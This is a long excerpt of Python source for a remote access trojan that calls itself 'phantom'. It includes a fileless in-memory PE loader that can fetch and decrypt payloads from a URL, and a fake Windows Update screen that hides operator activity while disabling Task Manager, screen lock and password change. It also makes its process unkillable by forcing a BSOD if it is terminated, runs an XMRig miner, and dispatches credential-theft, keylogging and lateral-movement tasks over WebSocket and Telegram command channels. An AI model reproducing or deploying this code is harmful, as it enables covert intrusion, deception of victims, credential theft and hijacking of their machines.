    def _pe_apply_relocs(base, rel_rva, rel_size, delta, is64):
        off = base + rel_rva
        end = off + rel_size
        fixed = 0
        while off < end:
            page_rva, bsize = struct.unpack("<II", ctypes.string_at(off, 8))
            if bsize == 0:
                break
            count = (bsize - 8) // 2
            for j in range(count):
                entry = int.from_bytes(ctypes.string_at(off + 8 + j * 2, 2), "little")
                etype = entry >> 12
                if etype == 0:
                    continue
                target = base + page_rva + (entry & 0xFFF)
                if etype == 10 and is64:  # DIR64
                    old = int.from_bytes(ctypes.string_at(target, 8), "little")
                    ctypes.memmove(target, struct.pack("<Q", (old + delta) & 0xFFFFFFFFFFFFFFFF), 8)
                    fixed += 1
                elif etype == 3 and not is64:  # HIGHLOW
                    old = int.from_bytes(ctypes.string_at(target, 4), "little")
                    ctypes.memmove(target, struct.pack("<I", (old + delta) & 0xFFFFFFFF), 4)
                    fixed += 1
            off += bsize
        return fixed

    def _pe_map_and_run(image, wait=False):
        if image[:2] != b"MZ":
            return "pe: bad MZ signature"
        e_lfanew = struct.unpack_from("<I", image, 0x3C)[0]
        if image[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
            return "pe: bad PE signature"
        coff = e_lfanew + 4
        machine, num_sec, _a, _b, _c, opt_size, _ch = struct.unpack_from("<HHIIIHH", image, coff)
        opt = coff + 20
        magic = struct.unpack_from("<H", image, opt)[0]
        is64 = magic == 0x20B
        entry_rva = struct.unpack_from("<I", image, opt + 16)[0]
        if is64:
            image_base = struct.unpack_from("<Q", image, opt + 24)[0]
            dd_off = opt + 112
        else:
            image_base = struct.unpack_from("<I", image, opt + 28)[0]
            dd_off = opt + 96
        size_img = struct.unpack_from("<I", image, opt + 56)[0]
        size_hdr = struct.unpack_from("<I", image, opt + 60)[0]
        num_dirs = struct.unpack_from("<I", image, opt + (108 if is64 else 92))[0]

        def dd(i):
            if i >= num_dirs:
                return 0, 0
            return struct.unpack_from("<II", image, dd_off + i * 8)

        imp_rva, _ = dd(1)
        rel_rva, rel_size = dd(5)

        base = kernel32.VirtualAlloc(
            ctypes.c_void_p(image_base) if image_base < 0x100000000 else None,
            size_img, 0x3000, 0x04)
        if not base:
            base = kernel32.VirtualAlloc(None, size_img, 0x3000, 0x04)
        if not base:
            return "pe: VirtualAlloc failed"
        base_addr = base if isinstance(base, int) else ctypes.cast(base, ctypes.c_void_p).value

        ctypes.memmove(base_addr, image[:size_hdr], size_hdr)
        for i in range(num_sec):
            so = opt + opt_size + i * 40
            vsize, vaddr, rsize, rptr = struct.unpack_from("<IIII", image, so + 8)
            if rsize and rptr:
                ctypes.memmove(base_addr + vaddr, image[rptr:rptr + rsize], rsize)

        delta = base_addr - image_base
        relocs = 0
        if delta and rel_rva and rel_size:
            relocs = _pe_apply_relocs(base_addr, rel_rva, rel_size, delta, is64)
        imports = []
        if imp_rva:
            imports = _pe_walk_imports(base_addr, imp_rva, is64)

        old = wintypes.DWORD()
        kernel32.VirtualProtect(ctypes.c_void_p(base_addr), size_img, 0x40, ctypes.byref(old))  # RWX

        entry = base_addr + entry_rva
        tid = wintypes.DWORD()
        kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)]
        kernel32.CreateThread.restype = ctypes.c_void_p
        h = kernel32.CreateThread(None, 0, ctypes.c_void_p(entry), None, 0, ctypes.byref(tid))
        if not h:
            return "pe: CreateThread failed"
        kernel32.CloseHandle(h)
        return "pe mapped @ 0x%x (delta %d, relocs %d, imports %d) entry thread %s" % (
            base_addr, delta, relocs, sum(int(x.split("(")[1].split(")")[0]) for x in imports) if imports else 0, tid.value)


def task_pe(args):
    """pe <key64hex> <b64(nonce16+aes256ctr(pe))> | peurl <key64hex> <url> — fileless."""
    parts = args.split(None, 2)
    if len(parts) < 2:
        return "pe: <key64hex> <b64> | peurl <key64hex> <url>"
    mode = "inline"
    keyhex, blob = parts[0], parts[1]
    if keyhex.lower() == "peurl":
        mode, keyhex, blob = "url", parts[1], parts[2] if len(parts) > 2 else ""
    try:
        key = bytes.fromhex(keyhex)
    except ValueError:
        return "pe: bad key hex"
    if mode == "url":
        import urllib.request
        import ssl
        req = urllib.request.Request(blob, method="GET")
        req.add_header("User-Agent", USER_AGENT)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            with urllib.request.urlopen(req, timeout=60, context=ctx) as resp:
                blob = resp.read().decode("utf-8", "ignore").strip()
        except Exception as exc:
            return "pe: fetch failed " + str(exc)
    try:
        raw = base64.b64decode(blob)
        nonce, ct = raw[:16], raw[16:]
        image = _aes_gcm_decrypt(key, nonce, ct)
    except Exception as exc:
        return "pe: decrypt failed " + str(exc)
    if image[:4] == b"MZ\x90\x00":
        image = image[0:]  # plain MZ head ok
    return _pe_map_and_run(image)
//#pragma endmodule


//#pragma module overlay
_OVERLAY = {"proc": None, "locked": False, "saved": {}, "protected": False}

# Fake Windows Update screen (ported from the verizon kit relay agent):
# fullscreen TopMost form in Windows blue, keyboard suppressed, random
# progress ticker, timed close. The user watches an update; the operator
# works. Launched via encoded PowerShell so the form still renders on the
# interactive desktop while the launcher itself stays hidden.
#
# v2 hardening: registry lockdown (Task Manager / Lock / Change Password),
# deny-terminate DACL on the overlay host, ProcessBreakOnTermination
# critical flag (forced kill == BSOD), watchdog respawn, full restore on stop.
_OVERLAY_PS = r"""
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$form.TopMost = $true
$form.ShowInTaskbar = $false
$label = New-Object System.Windows.Forms.Label
$label.Text = 'Working on updates'
$label.Font = New-Object System.Drawing.Font('Segoe UI Light', 42)
$label.ForeColor = [System.Drawing.Color]::White
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(([System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width - 500) / 2, 320)
$form.Controls.Add($label)
$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = '0% complete'
$percentLabel.Font = New-Object System.Drawing.Font('Segoe UI', 24)
$percentLabel.ForeColor = [System.Drawing.Color]::White
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(([System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width - 200) / 2, 420)
$form.Controls.Add($percentLabel)
$warnLabel = New-Object System.Windows.Forms.Label
$warnLabel.Text = "Don't turn off your PC. This will take a while."
$warnLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
$warnLabel.ForeColor = [System.Drawing.Color]::White
$warnLabel.AutoSize = $true
$warnLabel.Location = New-Object System.Drawing.Point(([System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width - 380) / 2, 500)
$form.Controls.Add($warnLabel)
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 3000
$script:percent = 0
$script:startTime = Get-Date
$timer.Add_Tick({
    $elapsed = ((Get-Date) - $script:startTime).TotalMinutes
    if ($elapsed -ge __MINUTES__) { $form.Close(); return }
    $script:percent = [math]::Min(99, $script:percent + (Get-Random -Minimum 1 -Maximum 8))
    $percentLabel.Text = "$($script:percent)% complete"
})
$timer.Start()
$form.KeyPreview = $true
$form.Add_KeyDown({ $_.Handled = $true; $_.SuppressKeyPress = $true })
$form.ShowDialog()
"""


def task_overlay(args):
    """overlay start [minutes] | overlay stop | overlay status | overlay lock|unlock (registry)"""
    if not IS_WIN:
        return "overlay: windows only"
    parts = args.split()
    sub = parts[0].lower() if parts else "status"

    proc = _OVERLAY.get("proc")
    active = proc is not None and proc.poll() is None

    if sub == "stop" or sub == "hide":
        return _overlay_stop()
    if sub in ("lock", "unlock"):
        return _overlay_lock(True if sub == "lock" else False)
    if sub in ("start", "on"):
        try:
            mins = int(parts[1]) if len(parts) > 1 else 10
        except (ValueError, IndexError):
            mins = 10
        if active:
            return "overlay already active"
        script = _OVERLAY_PS.replace("__MINUTES__", str(mins))
        enc = base64.b64encode(script.encode("utf-16-le")).decode()
        proc = subprocess.Popen(
            ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Enc", enc],
            creationflags=CREATE_NO_WINDOW)
        _OVERLAY["proc"] = proc
        time.sleep(1.5)
        _overlay_lock(True)
        _overlay_protect(proc)
        threading.Thread(target=_overlay_watchdog, args=(mins,), daemon=True).start()
        return "overlay live for %d min — locked, protected, user is watching an update" % mins
    if sub == "status":
        return "overlay active" if active else "overlay idle"
    return "overlay: start [minutes]|stop|status|lock|unlock"


def _overlay_stop():
    proc = _OVERLAY.get("proc")
    active = proc is not None and proc.poll() is None
    if active:
        try:
            proc.kill()  # stored handle predates the DACL — still full access
        except Exception:
            pass
        _OVERLAY["proc"] = None
    _overlay_lock(False)
    _overlay_unprotect(proc)
    # sweep strays by window title
    out = _run(
        "powershell -NoP -NonI -W Hidden -Command \"Get-Process powershell "
        "-ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "
        "'Working on updates' } | Stop-Process -Force\"", timeout=30, shell=False)
    return "overlay hidden, lockdown reverted " + (out.strip()[:60] if out.strip() else "")


def _overlay_watchdog(minutes):
    """Respawns the overlay if something kills it; re-arms protection."""
    deadline = time.time() + minutes * 60
    while time.time() < deadline and _OVERLAY.get("proc"):
        time.sleep(5)
        proc = _OVERLAY.get("proc")
        if not proc or proc.poll() is not None:
            if _OVERLAY.get("locked"):
                try:
                    _overlay_protect_restart()
                except Exception:
                    pass
            return


if IS_WIN:
    _PS_POLICIES = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"

    def _overlay_lock(enable):
        import winreg
        flags = {"DisableTaskMgr": 1, "DisableLockWorkstation": 1, "DisableChangePassword": 1}
        saved = _OVERLAY.setdefault("saved", {})
        hives = [(winreg.HKEY_CURRENT_USER, "HKCU")]
        if _privilege() in ("admin", "system"):
            hives.append((winreg.HKEY_LOCAL_MACHINE, "HKLM"))
        for hive, hname in hives:
            try:
                k = winreg.OpenKey(hive, _PS_POLICIES, 0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
            except Exception:
                continue
            if enable:
                for name in flags:
                    try:
                        saved[hname + "\\" + name] = winreg.QueryValueEx(k, name)[0]
                    except FileNotFoundError:
                        saved[hname + "\\" + name] = None
                    winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, flags[name])
                try:
                    subprocess.run(["taskkill", "/IM", "taskmgr.exe", "/F"],
                                   capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=15)
                except Exception:
                    pass
            else:
                for name in flags:
                    key = hname + "\\" + name
                    if key in saved:
                        old = saved[key]
                        try:
                            if old is None:
                                winreg.DeleteValue(k, name)
                            else:
                                winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, old)
                        except FileNotFoundError:
                            pass
                _OVERLAY["saved"] = {}
            winreg.CloseKey(k)
        _OVERLAY["locked"] = enable
        return "lockdown " + ("ON — task manager, lock, change password disabled" if enable else "OFF — restored")

    def _overlay_protect(proc):
        """Deny-terminate DACL + critical flag on the overlay host."""
        if not proc or not hasattr(proc, "pid"):
            return
        try:
            hproc = kernel32.OpenProcess(0x1FFFFF, False, proc.pid)  # full
            if not hproc:
                return
            advapi32.SetKernelObjectSecurity(hproc, 4, _deny_terminate_sd(hproc))
            ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
            state = ctypes.c_ulong(1)
            ntdll.NtSetInformationProcess(hproc, 29, ctypes.byref(state), ctypes.sizeof(state))  # ProcessBreakOnTermination
            _OVERLAY["protected"] = True
            # keep our own full-access handle for later kill
            kernel32.CloseHandle(hproc)
        except Exception:
            pass

    def _deny_terminate_sd(hproc):
        """SDDL: admins+system full, everyone else denied terminate."""
        sddl = "D:(A;;0x001F0FFF;;;BA)(A;;0x001F0FFF;;;SY)(D;;0x00000001;;;WD)"
        sd = ctypes.c_void_p()
        length = wintypes.ULONG()
        advapi32.ConvertStringSecurityDescriptorToSecurityDescriptorW(
            sddl, 1, ctypes.byref(sd), ctypes.byref(length))
        return sd

    def _overlay_unprotect(proc):
        try:
            if proc and hasattr(proc, "pid"):
                # process is being killed anyway; nothing to revert safely
                pass
        except Exception:
            pass

    def _overlay_protect_restart():
        # watchdog path: overlay died while locked — bring it back
        task_overlay("start 10")
//#pragma endmodule


//#pragma module miner
_miner_proc = None


def _miner_control(arg):
    global _miner_proc
    if arg == "stop":
        if _miner_proc:
            _miner_proc.terminate()
            _miner_proc = None
        return "miner stopped"
    if arg == "start" or arg == "":
        if not MINER_POOL or not MINER_WALLET:
            return "miner: pool/wallet not configured"
        cand = os.path.join(agent_dir(), "xmrig")
        if os.name == "nt":
            cand += ".exe"
        if not os.path.exists(cand):
            return "miner: binary not found (%s)" % cand
        _miner_proc = subprocess.Popen(
            [cand, "-o", MINER_POOL, "-u", MINER_WALLET, "--donate-level=1"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        return "miner started pid=%s" % _miner_proc.pid
    return "miner: start|stop"
//#pragma endmodule


# ---------------------------------------------------------------------------
# task dispatch
# ---------------------------------------------------------------------------
_MODULE_BLOCK_MAP = {
    "getsys": "esc", "runas": "runas", "steal": "esc", "uac": "uac", "worker": "runas",
    "screen": "screen", "hvnc": "hvnc", "keylog": "keylog", "lsass": "creds",
    "creds": "creds", "chrome": "creds", "wifi": "creds", "hives": "creds", "dpapi": "creds",
    "persist": "persist", "exec": "exec", "inject": "inject", "pymod": "pymod",
    "ps": "proc", "kill": "proc", "netrecon": "net", "portscan": "net", "lateral": "lateral",
    "runps": "net", "die": "selfdestruct", "overlay": "overlay",
}


def _handler_for(verb):
    handler = globals().get("task_" + verb)
    if handler:
        return handler
    return None


def run_task(verb, args, task_id=None):
    try:
        handler = _handler_for(verb)
        if handler:
            return handler(args)
        if verb == "shell" or verb == "cmd":
            return _run(args)
        return 'unknown verb "%s" (task %s)' % (verb, task_id or "-")
    except Exception as exc:
        return "task error: %s" % exc


def run_command(command):
    """Legacy string protocol — maps old verbs onto the task table."""
    parts = command.strip().split(None, 1)
    verb = parts[0].lower() if parts else ""
    args = parts[1] if len(parts) > 1 else ""
    try:
        if verb == "screenshot":
            return task_screen("")
        if verb == "persist":
            return task_persist(args or "run")
        if verb == "keylog":
            return task_keylog(args)
        if verb == "miner":
            return _miner_control(args)
        if verb == "cd":
            return "(cd handled per-shell)"
        if verb == "download":
            return _send_file(args)
        if verb == "upload":
            return _recv_file(args)
        if verb in ("hvnc", "ghost"):
            if verb == "ghost":
                return task_chrome("")
            return task_hvnc(args or "status")
        return _run(command)
    except Exception as exc:
        return "ERROR: %s" % exc


def handle_incoming(resp):
    """Returns output string or None (nothing to do)."""
    task = resp.get("task") if isinstance(resp, dict) else None
    if task and isinstance(task, dict) and task.get("task_id"):
        verb = task.get("verb", "shell")
        args = task.get("args", "")
        output = run_task(verb, args, task.get("task_id"))
        post_response("%s %s" % (verb, args), output, task_id=task["task_id"])
        return output
    header = _last_resp_headers.get("x-update") if HEADER_CARRY else None
    if header and (not resp.get("command")):
        try:
            task = json.loads(_ub64dec(header))
            if task.get("task_id"):
                output = run_task(task.get("verb", "shell"), task.get("args", ""), task["task_id"])
                post_response("%s %s" % (task.get("verb"), task.get("args", "")), output, task_id=task["task_id"])
                return output
        except Exception:
            pass
    command = resp.get("command") if isinstance(resp, dict) else None
    if command == "__TERMINATE__":
        return None
    if command:
        maybe = parse_maybe_task(command)
        if maybe:
            output = run_task(maybe["verb"], maybe.get("args", ""), maybe["task_id"])
            post_response("%s %s" % (maybe["verb"], maybe.get("args", "")), output, task_id=maybe["task_id"])
            return output
        output = run_command(command)
        post_response(command, output)
        return output
    return None


def parse_maybe_task(command):
    if isinstance(command, str) and command.startswith("{"):
        try:
            obj = json.loads(command)
            if obj.get("task_id") and obj.get("verb"):
                return obj
        except Exception:
            return None
    return None


# ---------------------------------------------------------------------------
# ws transport
# ---------------------------------------------------------------------------
//#pragma module ws
class WSClient:
    def __init__(self, url):
        self.url = url
        self.sock = None

    def _connect(self):
        import ssl
        u = self.url
        tls = u.startswith("wss")
        rest = u.split("://", 1)[1]
        hostport, path = (rest.split("/", 1) + [""])[:2]
        path = "/" + path
        host, port = (hostport.split(":") + ["80"])[:2]
        port = int(port) if port else (443 if tls else 80)
        raw = socket.create_connection((host, port), timeout=15)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            raw = ctx.wrap_socket(raw)
        key = base64.b64encode(os.urandom(16)).decode()
        req = ("GET %s?id=%s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n"
               % (path, SESSION_ID, hostport, key))
        raw.sendall(req.encode())
        buf = b""
        while b"\r\n\r\n" not in buf:
            part = raw.recv(4096)
            if not part:
                raise IOError("handshake failed")
            buf += part
        head = buf.split(b"\r\n\r\n", 1)[0].decode("latin1")
        if "101" not in head.split("\r\n")[0]:
            raise IOError("ws rejected: %s" % head.split("\r\n")[0])
        self.sock = raw

    def _read_exact(self, n):
        data = b""
        while len(data) < n:
            part = self.sock.recv(n - len(data))
            if not part:
                raise IOError("closed")
            data += part
        return data

    def send_frame(self, opcode, payload):
        if not self.sock:
            return False
        try:
            mask = os.urandom(4)
            header = bytes([0x80 | opcode])
            n = len(payload)
            if n < 126:
                header += bytes([0x80 | n])
            elif n < 65536:
                header += bytes([0x80 | 126]) + struct.pack(">H", n)
            else:
                header += bytes([0x80 | 127]) + struct.pack(">Q", n)
            masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
            self.sock.sendall(header + mask + masked)
            return True
        except Exception:
            self.sock = None
            return False

    def send_text(self, obj):
        return self.send_frame(0x1, json.dumps(obj).encode())

    def send_binary(self, opcode, payload):
        return self.send_frame(0x2, bytes([opcode]) + payload)

    def recv_message(self, timeout=35):
        if not self.sock:
            return None
        self.sock.settimeout(timeout)
        try:
            h = self._read_exact(2)
            opcode = h[0] & 0x0F
            masked = h[1] & 0x80
            n = h[1] & 0x7F
            if n == 126:
                n = struct.unpack(">H", self._read_exact(2))[0]
            elif n == 127:
                n = struct.unpack(">Q", self._read_exact(8))[0]
            mask = self._read_exact(4) if masked else None
            payload = self._read_exact(n) if n else b""
            if mask:
                payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
            if opcode == 0x8:
                raise IOError("closed by server")
            if opcode == 0x9:
                self.send_frame(0xA, payload)
                return None
            return opcode, payload
        except socket.timeout:
            return ("timeout", b"")
        except Exception:
            self.sock = None
            return ("closed", b"")


def _ws_send_binary(op, payload):
    c = _WS_STATE.get("client")
    if c:
        try:
            return c.send_binary(op, payload)
        except Exception:
            return False
    return False


def ws_loop():
    url = "%s://%s:%s/ws/agent?id=%s" % (
        "wss" if C2_SCHEME == "https" else "ws", C2_HOST, C2_PORT, SESSION_ID)
    while not _killswitch():
        try:
            client = WSClient(url)
            client._connect()
            _WS_STATE["client"] = client
            client.send_text({"type": "register", "info": sysinfo()})
            while not _killswitch():
                msg = client.recv_message(timeout=max(20, BEACON_INTERVAL * 4))
                if msg is None:
                    continue
                op, payload = msg
                if op == "timeout":
                    client.send_text({"type": "heartbeat"})
                    continue
                if op == "closed":
                    break
                if op == 0x2:
                    ftype = payload[0] if payload else 0
                    if ftype == 0x02:
                        try:
                            inp = json.loads(payload[1:].decode("utf-8"))
                            run_task("hvnc", "move %s %s" % (inp.get("x", 0), inp.get("y", 0))) if inp.get("action") == "move" else None
                            if inp.get("action") == "click":
                                run_task("hvnc", "click %s %s %s" % (inp.get("btn", "l"), inp.get("x", 0), inp.get("y", 0)))
                            elif inp.get("action") == "key":
                                run_task("hvnc", "key %s" % inp.get("vk", 0))
                            elif inp.get("action") == "type":
                                run_task("hvnc", "type %s" % inp.get("text", ""))
                        except Exception:
                            pass
                    continue
                if op == 0x1:
                    try:
                        msg_obj = json.loads(payload.decode("utf-8"))
                    except Exception:
                        continue
                    if msg_obj.get("type") == "command":
                        command = msg_obj.get("command", "")
                        maybe = parse_maybe_task(command)
                        if command == "__TERMINATE__":
                            return
                        if maybe:
                            out = run_task(maybe["verb"], maybe.get("args", ""), maybe["task_id"])
                            client.send_text({"type": "result", "command": "%s %s" % (maybe["verb"], maybe.get("args", "")), "output": _b64(out.encode()), "task_id": maybe["task_id"]})
                        else:
                            out = run_command(command)
                            client.send_text({"type": "result", "command": command, "output": _b64(out.encode())})
        except Exception:
            pass
        _WS_STATE["client"] = None
        _sleep(3)
//#pragma endmodule


# ---------------------------------------------------------------------------
# telegram transport
# ---------------------------------------------------------------------------
//#pragma module telegram
_TG_OFFSET = 0


def tg_api(method, **params):
    import urllib.request
    import ssl
    url = "https://api.telegram.org/bot%s/%s" % (TG_BOT_TOKEN, method)
    data = json.dumps(params).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=40, context=ctx) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


def tg_send(text):
    for i in range(0, len(text), 4000):
        tg_api("sendMessage", chat_id=TG_CHAT, text=text[i:i + 4000])


def telegram_loop():
    global _TG_OFFSET
    tg_send("[phantom] session online: %s / %s (%s) id=%s" % (
        socket.gethostname(), _username(), _privilege(), SESSION_ID))
    while not _killswitch():
        r = tg_api("getUpdates", offset=_TG_OFFSET, timeout=25, allowed_updates=["message"])
        if not r or not r.get("ok"):
            _sleep(5)
            continue
        for upd in r.get("result", []):
            _TG_OFFSET = max(_TG_OFFSET, upd["update_id"] + 1)
            msg = upd.get("message") or {}
            chat = str((msg.get("chat") or {}).get("id", ""))
            text = (msg.get("text") or "").strip()
            if chat != str(TG_CHAT) or not text.startswith("!"):
                continue
            command = text[1:]
            maybe = parse_maybe_task(command)
            if maybe:
                out = run_task(maybe["verb"], maybe.get("args", ""), maybe["task_id"])
            else:
                out = run_command(command)
            tg_send(out or "(no output)")
//#pragma endmodule


# ---------------------------------------------------------------------------
# main loop
# ---------------------------------------------------------------------------
def main():
    if _killswitch():
        return
    if anti_analysis_gate() and LAUNCH_MODE == "main":
        return

    info = sysinfo()

    if ENABLE_PERSIST and LAUNCH_MODE == "main":
        try:
            task_persist("run")
        except Exception:
            pass
    if ENABLE_KEYLOG:
        try:
            task_keylog("start")
        except Exception:
            pass
    if ENABLE_MINER:
        try:
            _miner_control("start")
        except Exception:
            pass

    if TRANSPORT == "ws":
        ws_loop()
        return
    if TRANSPORT == "telegram" and TG_BOT_TOKEN and TG_CHAT:
        telegram_loop()
        return

    post_beacon(info)
    if AUTO_ELEVATE == 1 and LAUNCH_MODE == "main":
        try:
            threading.Thread(target=_auto_escalate, daemon=True).start()
        except Exception:
            pass
    while True:
        resp = post_beacon(info)
        if resp is None:
            _sleep()
            _decoy()
            continue
        if handle_incoming(resp) is None and resp.get("command") == "__TERMINATE__":
            break
        _sleep()
        _decoy()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
